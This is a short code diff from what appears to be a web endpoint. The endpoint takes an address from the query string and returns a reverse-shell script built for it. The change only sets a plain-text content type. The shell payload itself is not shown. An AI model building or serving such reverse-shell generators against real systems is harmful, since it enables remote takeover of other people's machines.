@@ -39,6 +39,7 @@ fi`;
 const handler = (request, response) => {
 	const { address } = request.query;
 
+	response.setHeader('Content-Type', 'text/plain');
 	response.send(reverseShell(address));
 };
 
